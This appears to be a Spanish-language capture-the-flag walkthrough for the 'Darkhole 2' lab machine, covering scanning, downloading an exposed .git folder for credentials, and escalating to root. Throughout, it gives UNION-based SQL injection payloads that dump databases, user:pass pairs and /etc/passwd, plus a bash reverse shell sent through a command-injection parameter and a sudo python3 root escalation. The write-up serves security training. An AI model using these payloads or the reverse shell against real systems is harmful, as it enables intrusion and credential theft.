---
title: "Darkhole 2"
description: "Darkhole 2"
pubDate: 2025-05-20
---

https://www.youtube.com/watch?v=xYLNxmuH9Sg

# Fase de reconocimiento

## Descubrimiento de Host

````
nmap -sP 10.0.2.0/24
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240514190739.png)

## Buscamos puertos abiertos

````
nmap -sS -p- -T5 --min-rate=5000 -vvv -Pn -n 10.0.2.3
````

80
22

# Fase de ataque

## SQLI

En el login.php probamos si es vulnerable a SQLI.
Con Burpsuite interceptamos la conexion y probamos.
![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240514192423.png)
URLencodeamos
No funciona

## Git

La web contiene un proyecto Github .gitor
Lo descargamos

````
wget -r http://<ip>/.git
````

Miramos los logs del proyecto git

````
git log
````

Ver los cambios

````
git show <commit>
````

Encontramos usuario y contraseña en texto claro

## SQLI

Modificar la cabecera en el ?id=1 con ' order by 100-- - hasta encontrar la cantidad de columnas
![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240514193204.png)
Insertamos la SQLI para visualizar datos. URLencodearlo

1. Ver bases de datos

````
' union select 1,2,group_concat(schema_name),4,5,6 from information_schema.schemata-- -
````

2. Leer datos de la maquina

````
' union select 1,2,load_file("/etc/passwd"),4,5,6 from information_schema.schemata-- -
````

3. Ver las tablas de una BBDD

````
' union select 1,2,group_concat(table_name),4,5,6 from information_schema.tables where table_schema='<BBDD>'-- -
````

4. Ver las columnas de un tabla

````
' union select 1,2,group_concat(column_name),4,5,6 from information_schema.columns where table_schema='<BBDD>' and table_name='<tabla>'-- -
````

5. Ver contenido de las columnas

````
' union select 1,2,group_concat(user,':',pass),4,5,6 from '<tabla>'-- -
````

Hay usuario y contraseña para SSH
3. Nos conectamos por SSH

````
ssh <user>@<ip>
````

\[-\] ==pwned!==

# Privilege Escalation

Para ver puertos abiertos

````
netstat -nat
````

Ver donde esta corriendo el servicio

````
ps -faux | grep <puerto>
````

Hacemos Port Forwarding para ver el puerto interno en nuestra maquina

Hay una RCE en la web

````
?cmd=<comando>
````

1. Nos ponemos en escucha por el puerto 443

````
nc -nlvp 443
````

2. Mandamos la Reverse Shell

````
?cmd=bash -c "bash -i>& /dev/tcp/<ipA>/<port> 0>&1"
````

\[-\]
Vemos la contraseña del usuario en le historio de la terminal

````
cat .bash_history
````

Miramos privilegios con la contraseña encontrada

````
sudo -l
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240514200110.png)
Lanzamos python3 como root y lanzamos una bash

````
sudo -u root pyhton3
	import os
	os.system("bash")
````

\[+\] ==pwned!==
